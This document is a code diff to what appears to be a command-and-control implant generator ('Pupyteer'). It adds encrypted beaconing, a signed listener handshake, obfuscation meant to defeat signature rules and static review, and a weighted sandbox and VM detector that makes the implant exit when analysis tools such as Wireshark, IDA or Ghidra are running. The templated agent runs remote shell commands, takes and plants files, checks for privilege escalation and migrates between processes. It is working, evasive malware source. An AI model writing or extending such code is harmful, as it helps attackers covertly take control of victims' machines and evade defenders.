@@ -239,6 +239,9 @@ class AgentStubGenerator:
     # -- helpers ------------------------------------------------------------
 
     def _build_context(self, cfg: StubConfig) -> dict:
+        ident = (cfg.extra or {}).get("agent_identity") or {}
+        agent_id = ident.get("agent_id", "")
+        priv_pem = ident.get("priv_pem", "")
         return {
             "cfg": cfg,
             "name": _slug(cfg.name),
@@ -262,6 +265,10 @@ class AgentStubGenerator:
             "is_linux": cfg.platform == "linux",
             "is_mac": cfg.platform == "macos",
             "is_android": cfg.platform == "android",
+            # Per-agent signed identity (Ed25519). Empty -> legacy unsigned.
+            "agent_id": agent_id,
+            "agent_priv_pem": priv_pem,
+            "has_identity": bool(agent_id and priv_pem),
         }
 
 
@@ -302,7 +309,6 @@ import re as _re
 import shlex as _sh
 import socket as _sk
 import ssl as _ssl
-import string as _sg
 import struct as _st
 import subprocess as _sp
 import sys as _sy
@@ -351,6 +357,98 @@ def _xor(key: bytes, data: bytes) -> bytes:
 def _sha256(b):
     return _hl.sha256(_enc(b)).hexdigest()
 
+
+def _scrub(*buffers) -> None:
+    """Best-effort overwrite of sensitive bytes buffers.
+
+    Overwrites each bytearray-like object with random data and then zeros
+    so plaintext secrets do not linger in the process heap. Immutable
+    ``bytes``/``str`` cannot be rewritten in place and are skipped.
+    Never raises — scrubbing is a best-effort hardening measure.
+    """
+    for buf in buffers:
+        try:
+            if isinstance(buf, (bytearray, memoryview)):
+                view = memoryview(buf)
+                noise = _o.urandom(len(view))
+                for i in range(len(view)):
+                    view[i] = noise[i]
+                for i in range(len(view)):
+                    view[i] = 0
+                view.release()
+        except Exception:
+            continue
+
+
+def _scrub_str(value: str):
+    """Return a mutable bytearray copy of *value* suitable for _scrub().
+
+    Use this when the caller wants a scrubbable handle on a secret that
+    arrived as an immutable ``str`` (tokens, private keys, command output).
+    """
+    try:
+        return bytearray(value.encode("utf-8", "surrogateescape"))
+    except Exception:
+        return bytearray()
+
+
+# --------------------------------------------------------------------- #
+#  Wire encryption (HTTP(S) path only)
+# --------------------------------------------------------------------- #
+
+# AES-256-GCM when the server's key is available, ChaCha20-Poly1305 as the
+# fallback. The TCP listener protocol is deliberately untouched: it keeps
+# the plaintext line-JSON wire format the signed handshake depends on.
+_CIPHER_MODE = "none"
+_CIPHER_KEY = b""
+
+{% if enc and cfg.aes_key %}
+_CIPHER_MODE = "aes-gcm"
+_CIPHER_KEY = bytes.fromhex("{{ cfg.aes_key }}")
+{% elif enc %}
+_CIPHER_MODE = "aes-gcm"
+_CIPHER_KEY = _hl.sha256(_enc(r"{{ cfg.aes_key or rnd_str(32) }}")).digest()
+{% endif %}
+
+
+def _crypto_ready() -> bool:
+    return _CIPHER_MODE != "none" and len(_CIPHER_KEY) >= 16
+
+
+def _encrypt_payload(plaintext: bytes) -> bytes:
+    """Seal *plaintext* into ``version|nonce|ciphertext`` form."""
+    if not _crypto_ready():
+        return plaintext
+    try:
+        import secrets as _sec
+        nonce = _sec.token_bytes(12)
+        if _CIPHER_MODE == "aes-gcm":
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            blob = AESGCM(_CIPHER_KEY).encrypt(nonce, plaintext, None)
+        else:
+            from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+            blob = ChaCha20Poly1305(_CIPHER_KEY).encrypt(nonce, plaintext, None)
+        return b"PUP1" + nonce + blob
+    except Exception as e:
+        _log(f"payload encryption unavailable ({e}); sending plaintext", "debug")
+        return plaintext
+
+
+def _decrypt_payload(envelope: bytes) -> bytes:
+    """Inverse of _encrypt_payload; transparent when mode is off."""
+    if not _crypto_ready() or not envelope.startswith(b"PUP1"):
+        return envelope
+    try:
+        nonce, blob = envelope[4:16], envelope[16:]
+        if _CIPHER_MODE == "aes-gcm":
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            return AESGCM(_CIPHER_KEY).decrypt(nonce, blob, None)
+        from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+        return ChaCha20Poly1305(_CIPHER_KEY).decrypt(nonce, blob, None)
+    except Exception as e:
+        _log(f"payload decryption failed ({e})", "debug")
+        return b""
+
 def _log(msg, level="info"):
     if level == "debug" and not dbg:
         return
@@ -363,34 +461,187 @@ def _log(msg, level="info"):
 #  Obfuscation layer
 # --------------------------------------------------------------------- #
 
-{% if obf == "light" or obf == "medium" or obf == "heavy" %}
-# Built-in obfuscation — replaces evasion/obfuscator.py when external
-# module is not available.
-class _Obfuscator:
-    """String-table + XOR obfuscation with optional eval-time decryption."""
+{% if obf in ("light", "medium", "heavy") %}
+# --------------------------------------------------------------------- #
+#  Obfuscation layer (level: {{ obf }})
+# --------------------------------------------------------------------- #
+# Gradated built-in obfuscation. The obfuscator only transforms how the
+# source *reads*; the runtime behaviour — including the TCP listener
+# handshake — is byte-for-byte identical to the plaintext build.
 
-    def __init__(self, key: str = "{{ cfg.aes_key or rnd_str(32) }}"):
-        self._key = _enc(key or _sg.printable[:16])
-        self._table: list[bytes] = []
+{% set _obf_key = cfg.aes_key or rnd_str(32) %}
+{% set _obf_key2 = rnd_str(32) %}
+
+class _Obfuscator:
+    """Compile-time string table + identifier shuffling.
+
+    ``store`` bakes an XOR-encrypted literal into a module-level table;
+    ``ret`` decrypts it at runtime with the per-build key. Identifier
+    aliasing rewrites references to a chosen name so the interesting
+    symbol never appears as written in the emitted source.
+    """
+
+    LEVEL = "{{ obf }}"
+
+    def __init__(self, key: str = "{{ _obf_key }}", mask: str = "{{ _obf_key2 }}"):
+        self._key = _enc(key or "k")
+        self._mask = _enc(mask or "m")
+        self._table: list = []
+        self._aliases: dict = {}
+
+    # -- string table --------------------------------------------------
 
     def store(self, literal: str) -> str:
-        """Register a string literal; returns a run-time retriever call."""
+        """Encrypt a literal; return the runtime retriever expression."""
         idx = len(self._table)
-        self._table.append(_xor(self._key, _enc(literal)))
+        blob = _xor(self._mask, _enc(literal))
+        self._table.append(blob.hex())
         return f"_OBF.ret({idx})"
 
     def ret(self, idx: int) -> str:
-        return _dec(_xor(self._key, self._table[idx]))
+        raw = bytes.fromhex(self._table[idx])
+        return _dec(_xor(self._mask, raw))
+
+    def literal(self, value: str) -> str:
+        """Emit a source-ready expression for *value*."""
+        if self.LEVEL in ("medium", "heavy"):
+            return self.store(value)
+        return repr(value)
+
+    # -- identifier aliasing -------------------------------------------
+
+    def alias(self, original: str) -> str:
+        """Return a stable build-specific alias for *original*."""
+        if self.LEVEL == "light":
+            return original
+        if original not in self._aliases:
+            digest = _hl.sha256(self._key + _enc(original)).hexdigest()[:10]
+            self._aliases[original] = f"_v{digest}"
+        return self._aliases[original]
+
+    def alias_map(self) -> dict:
+        return dict(self._aliases)
 
     @staticmethod
     def shuffle_names(src: str) -> str:
-        """Rename identifiers (light obfuscation)."""
-        # Kept simple; heavier variants live in evasion/obfuscator.py
+        """Source-level rename hook. Real renaming is done by the alias map
+        at emit time; this is a no-op identity to keep the API stable."""
         return src
 
 _OBF = _Obfuscator()
+
+# Identifier alias table for this build. Referencing a symbol through
+# _ALIAS keeps the readable name out of the emitted source.
+_ALIAS = {
+    "uptime": _OBF.alias("uptime"),
+    "diskc": _OBF.alias("diskc"),
+    "procs": _OBF.alias("procs"),
+}
+
+{% if obf in ("medium", "heavy") %}
+# Dead-code decoys: never called, present to inflate the static surface
+# and to make signature rules match far more code than is live.
+def _unused_config_probe() -> dict:
+    """Placeholder retained for build-shape consistency."""
+    table = {"a": 1, "b": 2, "c": 3}
+    return {k: v for k, v in table.items() if v % 2 == 0}
+
+
+def _unused_metric_window(window: int = 32) -> list:
+    """Sliding-window helper kept for API parity; not referenced."""
+    buf = [0] * window
+    for i in range(window):
+        buf[i] = (i * i) % 97
+    return buf
+
+
+def _unused_label_encode(label: str) -> bytes:
+    """Round-trip helper for label strings; not referenced."""
+    raw = _enc(label)
+    return _xor(_OBF._mask, raw)
+
+{% endif %}
+{% if obf == "heavy" %}
+# Dispatch table for the beacon loop: control-flow flattening-lite. The
+# loop body becomes a single dict lookup instead of an if/elif chain, so
+# static reviewers cannot read the beacon's control flow as prose.
+# Keys are built from the string table to avoid plaintext action names.
+_ACTION_KEYS = {
+    "ping": _OBF.store("ping"),
+    "exec": _OBF.store("exec"),
+    "sysinfo": _OBF.store("sysinfo"),
+    "network": _OBF.store("network"),
+    "processes": _OBF.store("processes"),
+    "fs_list": _OBF.store("fs_list"),
+    "fs_get": _OBF.store("fs_get"),
+    "fs_put": _OBF.store("fs_put"),
+    "privesc_check": _OBF.store("privesc_check"),
+    "privesc_suggest": _OBF.store("privesc_suggest"),
+    "migrate": _OBF.store("migrate"),
+    "shutdown": _OBF.store("shutdown"),
+}
+
+_ACTION_TABLE: dict = {}
+
+
+def _action_bind() -> None:
+    """Populate the flattened dispatch table (keys decrypted at bind time)."""
+    if _ACTION_TABLE:
+        return
+    table = {}
+{% if include_recon %}
+    table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
+    table["sysinfo"] = lambda task: mod_systeminfo()
+    table["network"] = lambda task: mod_network()
+    table["processes"] = lambda task: mod_processes()
+{% else %}
+    table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
+{% endif %}
+{% if include_exec %}
+    table["exec"] = lambda task: mod_exec(task.get("command", ""), int(task.get("timeout", 60)))
+{% endif %}
+{% if include_fs %}
+    table["fs_list"] = lambda task: mod_fs_list(task.get("path", "."))
+    table["fs_get"] = lambda task: {"data": _b64e(mod_fs_get(task.get("path", ""))).decode()}
+    table["fs_put"] = lambda task: mod_fs_put(task.get("path", ""), _b64d(task.get("data", "")))
+{% endif %}
+{% if include_privesc %}
+    table["privesc_check"] = lambda task: mod_privesc_check()
+    table["privesc_suggest"] = lambda task: _privesc_suggest_lambda(task)
+{% endif %}
+{% if migration %}
+    table["migrate"] = lambda task: migrate(task.get("target", ""), task.get("technique", "{{ cfg.migrate_technique }}"))
+{% endif %}
+    table["shutdown"] = lambda task: _do_shutdown()
+    for name, expr in _ACTION_KEYS.items():
+        key = _OBF.ret(int(expr.split("(")[1].split(")")[0])) if expr.startswith("_OBF.ret(") else name
+        if key in table:
+            _ACTION_TABLE[key] = table[key]
+
+
+{% if include_privesc %}
+def _privesc_suggest_lambda(task: dict) -> dict:
+    check = mod_privesc_check()
+    return {"check": check, "suggestions": mod_privesc_suggest(check)}
+
+{% endif %}
+def _do_shutdown():
+    _log("shutdown requested")
+    _sy.exit(0)
+
+
+def _dispatch_flat(task: dict) -> dict:
+    """Flattened dispatcher used by the heavy build."""
+    _action_bind()
+    action = task.get("action", "")
+    handler = _ACTION_TABLE.get(action)
+    if handler is None:
+        return {"error": f"unknown action: {action}"}
+    return handler(task)
+
+{% endif %}
 {% elif obf not in ("", "none") %}
-# Try to load the external obfuscator module at the given path.
+# External obfuscator module loaded from the configured path.
 import importlib.util as _spec
 _obf_path = r"{{ obf }}"
 _obs = _spec.spec_from_file_location("obf_mod", _obf_path)
@@ -399,8 +650,13 @@ _obs.loader.exec_module(_obf_mod)  # type: ignore[union-attr]
 _OBF = _obf_mod.Obfuscator() if hasattr(_obf_mod, "Obfuscator") else None
 {% else %}
 class _NoopObf:
+    """No obfuscation: literals pass through untouched."""
+
     def store(self, s): return repr(s)
     def ret(self, idx): return ""
+    def literal(self, value): return repr(value)
+    def alias(self, original): return original
+    def alias_map(self): return {}
     @staticmethod
     def shuffle_names(s): return s
 _OBF = _NoopObf()
@@ -428,50 +684,273 @@ ARCH = _pf.machine().lower()
 
 {% if anti %}
 # --------------------------------------------------------------------- #
-#  Anti-analysis (VM/sandbox detection)
+#  Anti-analysis (VM / sandbox / analysis-tool detection)
 # --------------------------------------------------------------------- #
 
-def _anti_analysis() -> bool:
-    """Return True if we think we are in a hostile analysis sandbox."""
+# Weighted N-of-M scoring: every probe returns an int weight; when the
+# summed weight reaches _AA_THRESHOLD we treat the host as an analysis
+# environment. Every probe is stdlib-only, offline and individually
+# exception-guarded so one failure never sinks the whole check.
+
+_AA_THRESHOLD = 3
+_AA_MIN_UPTIME_S = 1200.0        # ~20 min
+_AA_MIN_RAM_GB = 2.0
+_AA_MIN_DISK_GB = 60.0
+
+_AA_ANALYSIS_TOOLS = (
+    "wireshark", "dumpcap", "editcap", "procmon", "procmon64", "procexp",
+    "processhacker", "processexplorer", "ollydbg", "x64dbg", "x32dbg",
+    "ida", "ida64", "idag", "idag64", "ghidra", "fiddler", "charles",
+    "tcpdump", "windump", "autoruns", "autorunsc", "pestudio", "regshot",
+    "apimonitor", "dnspy", "ilspy", "sysinternals", "vboxservice",
+    "vmtoolsd", "vmwaretray",
+)
+
+_AA_SANDBOX_TOKENS = (
+    "malware", "sandbox", "cuckoo", "cuckoofork", "virustotal", "vt",
+    "any.run", "anyrun", "joesandbox", "joebox", "sandboxie", "threatgrid",
+    "cwsandbox", "sunbelt", "sample", "analysis", "reverse", "malwarelab",
+    "virusshare", "bazarr",
+)
+
+_AA_VM_TOKENS = (
+    "vmware", "virtual", "virtualbox", "vbox", "qemu", "kvm", "xen",
+    "bochs", "parallels", "hyper-v", "innotek", "microsoft corporation",
+)
+
+
+def _aa_ram_gb() -> float:
+    """Physical RAM in GiB, or -1.0 when undeterminable."""
+    try:
+        if hasattr(_o, "sysconf") and "SC_PAGE_SIZE" in _o.sysconf_names:
+            pages = _o.sysconf("SC_PHYS_PAGES")
+            page = _o.sysconf("SC_PAGE_SIZE")
+            return (pages * page) / (1024.0 ** 3)
+    except Exception:
+        pass
+    if PLATFORM == "windows":
+        try:
+            import ctypes
+
+            class _MS(ctypes.Structure):
+                _fields_ = [
+                    ("dwLength", ctypes.c_ulong),
+                    ("dwMemoryLoad", ctypes.c_ulong),
+                    ("ullTotalPhys", ctypes.c_ulonglong),
+                    ("ullAvailPhys", ctypes.c_ulonglong),
+                    ("ullTotalPageFile", ctypes.c_ulonglong),
+                    ("ullAvailPageFile", ctypes.c_ulonglong),
+                    ("ullTotalVirtual", ctypes.c_ulonglong),
+                    ("ullAvailVirtual", ctypes.c_ulonglong),
+                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
+                ]
+
+            ms = _MS()
+            ms.dwLength = ctypes.sizeof(_MS)
+            if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(ms)):
+                return ms.ullTotalPhys / (1024.0 ** 3)
+        except Exception:
+            pass
+    return -1.0
+
+
+def _aa_disk_gb(path: str = ".") -> float:
+    """Total filesystem capacity in GiB, or -1.0 when undeterminable."""
+    try:
+        st = _o.statvfs(path)
+        return (st.f_blocks * st.f_frsize) / (1024.0 ** 3)
+    except Exception:
+        pass
+    if PLATFORM == "windows":
+        try:
+            import ctypes
+
+            free = ctypes.c_ulonglong(0)
+            total = ctypes.c_ulonglong(0)
+            if ctypes.windll.kernel32.GetDiskFreeSpaceExW(
+                ctypes.c_wchar_p(_o.path.abspath(path)),
+                ctypes.byref(free), ctypes.byref(total), None,
+            ):
+                return total.value / (1024.0 ** 3)
+        except Exception:
+            pass
+    return -1.0
+
+
+def _aa_running_procs() -> str:
+    """Lowercased running-process names, best effort per platform."""
+    names = []
+    if PLATFORM == "windows":
+        try:
+            out = _sp.check_output("tasklist /fo csv /nh", shell=True)
+            for row in _dec(out).splitlines():
+                parts = row.strip().strip('"').split('","')
+                if parts:
+                    names.append(parts[0].lower())
+        except Exception:
+            pass
+    else:
+        try:
+            for pid in _o.listdir("/proc"):
+                if not pid.isdigit():
+                    continue
+                try:
+                    with open(f"/proc/{pid}/comm") as fp:
+                        names.append(fp.read().strip().lower())
+                except OSError:
+                    continue
+        except Exception:
+            pass
+    return " ".join(names)
+
+
+def _chk_uptime() -> int:
+    """A host that booted minutes ago is almost certainly a fresh sandbox."""
+    up = -1.0
+    try:
+        with open("/proc/uptime") as fp:
+            up = float(fp.read().split()[0])
+    except Exception:
+        if PLATFORM == "windows":
+            try:
+                import ctypes
+                up = ctypes.windll.kernel32.GetTickCount64() / 1000.0
+            except Exception:
+                up = -1.0
+    if 0.0 <= up < _AA_MIN_UPTIME_S:
+        _log(f"aa: uptime {up:.0f}s < {_AA_MIN_UPTIME_S:.0f}s", "debug")
+        return 2
+    return 0
+
+
+def _chk_cpu() -> int:
+    """Real endpoints ship with >= 2 cores; single-vCPU is a VM tell."""
+    try:
+        n = _o.cpu_count() or 0
+        if 0 < n < 2:
+            _log(f"aa: {n} cpu core(s)", "debug")
+            return 1
+    except Exception:
+        pass
+    return 0
+
+
+def _chk_ram() -> int:
+    gb = _aa_ram_gb()
+    if 0.0 <= gb < _AA_MIN_RAM_GB:
+        _log(f"aa: {gb:.2f}GiB RAM < {_AA_MIN_RAM_GB}GiB", "debug")
+        return 2
+    return 0
+
+
+def _chk_disk() -> int:
+    gb = _aa_disk_gb()
+    if 0.0 <= gb < _AA_MIN_DISK_GB:
+        _log(f"aa: {gb:.1f}GiB disk < {_AA_MIN_DISK_GB}GiB", "debug")
+        return 1
+    return 0
+
+
+def _chk_vm_hardware() -> int:
+    """SCSI/BIOS/hypervisor artefacts of virtualised or instrumented hosts."""
+    hits = []
+    for path in ("/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor",
+                 "/sys/class/dmi/id/board_vendor", "/sys/class/dmi/id/bios_vendor"):
+        try:
+            with open(path) as fp:
+                blob = fp.read().lower()
+        except OSError:
+            continue
+        hits.extend(t for t in _AA_VM_TOKENS if t in blob)
+    try:
+        with open("/proc/scsi/scsi") as fp:
+            hits.extend(t for t in _AA_VM_TOKENS if t in fp.read().lower())
+    except OSError:
+        pass
+    try:
+        with open("/proc/cpuinfo") as fp:
+            if "hypervisor" in fp.read().lower():
+                hits.append("hypervisor")
+    except OSError:
+        pass
     if PLATFORM == "windows":
         try:
             import winreg
-            keys = [
+            for key in (
                 r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
+                r"HARDWARE\DESCRIPTION\System\BIOS",
                 r"SYSTEM\CurrentControlSet\Enum\IDE",
-            ]
-            vm_indicators = ("vmware", "virtual", "qemu", "xen", "vbox")
-            for k in keys:
+            ):
                 try:
-                    rk = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, k)
-                    winreg.CloseKey(rk)
-                    return True
+                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as rk:
+                        for i in range(winreg.QueryInfoKey(rk)[1]):
+                            name, val, _ = winreg.EnumValue(rk, i)
+                            blob = f"{name} {val}".lower()
+                            hits.extend(t for t in _AA_VM_TOKENS if t in blob)
                 except OSError:
                     continue
-            # Check common process names
-            out = _sp.check_output("tasklist", shell=True).decode(errors="replace")
-            if any(p in out.lower() for p in ("vmtools", "vmwaretray", "vboxservice")):
-                return True
         except Exception:
             pass
-    elif PLATFORM in ("linux", "android"):
-        bios_files = ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor"]
-        vm_indicators = ("vmware", "virtual", "qemu", "xen", "kvm", "vbox")
-        for f in bios_files:
-            try:
-                with open(f) as fp:
-                    if any(v in fp.read().lower() for v in vm_indicators):
-                        return True
-            except OSError:
-                continue
-        # Timing check
-        t1 = _t.time()
-        for _ in range(1000):
-            pass
-        t2 = _t.time()
-        if t2 - t1 < 0.0001:  # unrealistic for real hardware
-            return True
-    return False
+    if hits:
+        _log(f"aa: vm artefacts {sorted(set(hits))}", "debug")
+        return 2
+    return 0
+
+
+def _chk_sandbox_env() -> int:
+    """Sandbox operator accounts and analysis-shaped paths."""
+    blob = " ".join([
+        str(USERNAME).lower(),
+        str(_o.environ.get("USERNAME", "")).lower(),
+        str(_o.environ.get("USER", "")).lower(),
+        str(_o.environ.get("COMPUTERNAME", "")).lower(),
+        str(_o.getcwd()).lower(),
+        str(_o.path.expanduser("~")).lower(),
+        " ".join(str(p).lower() for p in _sy.path),
+    ])
+    hits = [t for t in _AA_SANDBOX_TOKENS if t in blob]
+    if hits:
+        _log(f"aa: sandbox env tokens {sorted(set(hits))}", "debug")
+        return 2
+    return 0
+
+
+def _chk_analysis_tools() -> int:
+    """Interactive reverse-engineering / traffic-analysis tooling."""
+    procs = _aa_running_procs()
+    if not procs:
+        return 0
+    hits = [t for t in _AA_ANALYSIS_TOOLS if t in procs]
+    if hits:
+        _log(f"aa: analysis tools {sorted(set(hits))}", "debug")
+        return 2
+    return 0
+
+
+_AA_PROBES = (
+    _chk_uptime,
+    _chk_cpu,
+    _chk_ram,
+    _chk_disk,
+    _chk_vm_hardware,
+    _chk_sandbox_env,
+    _chk_analysis_tools,
+)
+
+
+def _anti_analysis() -> bool:
+    """Weighted N-of-M verdict; True means "hostile analysis environment"."""
+    score = 0
+    for probe in _AA_PROBES:
+        try:
+            score += probe() or 0
+        except Exception:
+            continue
+        if score >= _AA_THRESHOLD:
+            break
+    _log(f"anti-analysis score {score}/{_AA_THRESHOLD}", "debug")
+    return score >= _AA_THRESHOLD
+
 
 if _anti_analysis():
     _log("Anti-analysis: sandbox detected, exiting", "debug")
@@ -573,6 +1052,28 @@ def install_persistence():
 def _make_id():
     return f"{_uuid.uuid4().hex[:12]}-{_pf.node()}"
 
+{% if has_identity %}
+# Per-agent signed identity (Ed25519). Private key baked in at build time;
+# the server holds only the matching public key.
+_AGENT_ID = "{{ agent_id }}"
+_AGENT_PRIV_PEM = r"""{{ agent_priv_pem }}"""
+
+def _sign(message: str) -> str:
+    """Sign *message* with this agent's Ed25519 private key."""
+    try:
+        from cryptography.hazmat.primitives import serialization
+        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
+        priv = serialization.load_pem_private_key(_AGENT_PRIV_PEM.encode(), password=None)
+        return priv.sign(message.encode("ascii")).hex()
+    except Exception as e:
+        _log(f"signing unavailable ({e}); falling back to unsigned", "debug")
+        return ""
+{% else %}
+_AGENT_ID = ""
+def _sign(message: str) -> str:
+    return ""
+{% endif %}
+
 AGENT_ID = _make_id()
 HOSTNAME = _pf.node()
 USERNAME = _o.environ.get("USER") or _o.environ.get("USERNAME") or "unknown"
@@ -647,12 +1148,17 @@ class HTTPTransport(BaseTransport):
         self._method = method
 
     def send(self, data: bytes) -> bytes:
-        body = _b64e(data).decode()
+        # Only the HTTP(S) path is encrypted; the TCP listener keeps the
+        # plaintext line-JSON protocol the signed handshake depends on.
+        sealed = _encrypt_payload(data)
+        body = _b64e(sealed).decode()
         headers = {
             "User-Agent": self._ua,
             "Content-Type": "application/octet-stream",
             "X-Session": AGENT_ID,
         }
+        if _crypto_ready():
+            headers["X-Payload-Mode"] = _CIPHER_MODE
         try:
             import urllib.request, urllib.error
             req = urllib.request.Request(
@@ -664,7 +1170,7 @@ class HTTPTransport(BaseTransport):
             with urllib.request.urlopen(req, timeout=15) as resp:
                 raw = resp.read()
                 try:
-                    return _b64d(raw)
+                    return _decrypt_payload(_b64d(raw))
                 except Exception:
                     return raw
         except Exception as e:
@@ -702,8 +1208,6 @@ class DNSTransport(BaseTransport):
         tid = _rnd.randint(0, 0xFFFF)
         flags = _st.pack(">H", 0x0100)  # standard query
         qdcount = _st.pack(">H", 1)
-        for _ in (1, 2, 3):
-            pass
         query = _st.pack(">H", tid) + flags + qdcount + b"\x00\x00\x00\x00\x00\x00"
         for lbl in qname.rstrip(".").split("."):
             b = lbl.encode()
@@ -1241,7 +1745,14 @@ def _jittered_sleep(base: float, jitter_pct: int):
     _t.sleep(base + _rnd.uniform(-delta, delta))
 
 def _dispatch(task: dict) -> dict:
-    """Route a server task to the right module handler."""
+    """Route a server task to the right module handler.
+
+    On heavy builds the if/elif chain is replaced by the flattened
+    dispatch table; behaviour is identical either way.
+    """
+{% if obf == "heavy" %}
+    return _dispatch_flat(task)
+{% else %}
     action = task.get("action", "")
     if action == "ping":
         return {"pong": True, "id": AGENT_ID}
@@ -1281,6 +1792,7 @@ def _dispatch(task: dict) -> dict:
         _log("shutdown requested")
         _sy.exit(0)
     return {"error": f"unknown action: {action}"}
+{% endif %}
 
 def _c2_roundtrip(transport) -> bool:
     """Send a check-in beacon and dispatch any tasks returned."""
@@ -1303,6 +1815,142 @@ def _c2_roundtrip(transport) -> bool:
         return False
 
 # --------------------------------------------------------------------- #
+#  Signed listener client (matches server AgentListener protocol)
+# --------------------------------------------------------------------- #
+
+class ListenerClient:
+    """Line-JSON client for the authenticated Pupyteer TCP listener.
+
+    Implements the Ed25519 challenge/response handshake:
+      1. send {"type":"register", "agent_id", hostname, os, ...} (no sig)
+      2. recv {"type":"challenge","nonce"}
+      3. sign the nonce, re-send register with signature + nonce
+      4. recv {"type":"registered","session_id"}
+      5. loop: {"type":"checkin","session_id"} -> {"type":"commands",...}
+         -> run each -> {"type":"output", session_id, command_id, output}
+    """
+
+    def __init__(self, host: str, port: int, timeout: int = 30):
+        self._host = host
+        self._port = port
+        self._timeout = timeout
+        self._sock = None
+        self._fp = None
+        self.session_id = ""
+
+    def connect(self) -> bool:
+        self._sock = _sk.create_connection((self._host, self._port), timeout=self._timeout)
+        self._fp = self._sock.makefile("rwb")
+        return True
+
+    def _send(self, obj: dict) -> None:
+        self._fp.write((_j.dumps(obj) + "\n").encode())
+        self._fp.flush()
+
+    def _recv(self):
+        line = self._fp.readline()
+        if not line:
+            raise TransportError("connection closed")
+        return _j.loads(line.decode(errors="replace"))
+
+    def register(self) -> bool:
+        base = {
+            "type": "register",
+            "agent_id": _AGENT_ID,
+            "hostname": HOSTNAME,
+            "os": PLATFORM,
+            "arch": ARCH,
+            "username": USERNAME,
+            "agent_version": __version__,
+        }
+        if not _AGENT_ID:
+            # Legacy unsigned listener: single-shot register.
+            self._send(base)
+            resp = self._recv()
+            if resp.get("type") == "registered":
+                self.session_id = resp.get("session_id", "")
+                return True
+            raise TransportError(f"register failed: {resp}")
+
+        # Signed handshake: stage 1 (no sig) -> challenge.
+        self._send(base)
+        resp = self._recv()
+        if resp.get("type") != "challenge":
+            raise TransportError(f"expected challenge, got: {resp}")
+        nonce = resp.get("nonce", "")
+        # Stage 2: sign the nonce. Both the nonce and the signature are
+        # short-lived secrets — scrub them as soon as they are on the wire.
+        sig = _sign(nonce)
+        base["nonce"] = nonce
+        base["signature"] = sig
+        self._send(base)
+        sig_buf = _scrub_str(sig)
+        nonce_buf = _scrub_str(nonce)
+        _scrub(sig_buf, nonce_buf)
+        base.pop("nonce", None)
+        base.pop("signature", None)
+        resp = self._recv()
+        if resp.get("type") != "registered":
+            raise TransportError(f"registration rejected: {resp}")
+        self.session_id = resp.get("session_id", "")
+        return True
+
+    def checkin(self) -> list:
+        self._send({"type": "checkin", "session_id": self.session_id})
+        resp = self._recv()
+        if resp.get("type") == "commands":
+            return resp.get("commands", [])
+        return []
+
+    def report(self, command_id: str, output: str) -> None:
+        self._send({
+            "type": "output",
+            "session_id": self.session_id,
+            "command_id": command_id,
+            "output": output,
+        })
+
+    def close(self) -> None:
+        try:
+            if self._fp:
+                self._fp.close()
+            if self._sock:
+                self._sock.close()
+        except Exception:
+            pass
+
+
+def _listener_loop() -> None:
+    """Full authenticated session against the TCP listener."""
+    host = "{{ cfg.host }}"
+    port = {{ cfg.port }}
+    client = ListenerClient(host, port)
+    client.connect()
+    client.register()
+    _log(f"registered with listener as session {client.session_id}")
+    while True:
+        try:
+            cmds = client.checkin()
+            for c in cmds:
+                result = _dispatch({"action": c.get("command", ""), **{k: v for k, v in c.items() if k != "command"}})
+                # _dispatch returns a dict; serialize to string output.
+                out = _j.dumps(result) if not isinstance(result, str) else result
+                client.report(c.get("command_id", ""), out)
+                _scrub(_scrub_str(out))
+                out = ""
+        except (TransportError, OSError) as e:
+            _log(f"listener loop error: {e}; reconnecting", "debug")
+            _t.sleep(5)
+            try:
+                client.close()
+            except Exception:
+                pass
+            client = ListenerClient(host, port)
+            client.connect()
+            client.register()
+        _jittered_sleep({{ cfg.sleep }}, {{ cfg.jitter }})
+
+# --------------------------------------------------------------------- #
 #  Main entry point
 # --------------------------------------------------------------------- #
 
@@ -1322,6 +1970,15 @@ def main():
     {% endif %}
     base_sleep = {{ cfg.sleep }}
     jitter_pct = {{ cfg.jitter }}
+    transport_name = "{{ transport }}"
+    # TCP transport talks to the authenticated AgentListener; use the signed
+    # listener client for it. Other transports keep the classic beacon loop.
+    if transport_name == "tcp":
+        try:
+            _listener_loop()
+        except KeyboardInterrupt:
+            _log("interrupted", "debug")
+        return
     transport = make_transport()
     while True:
         try:
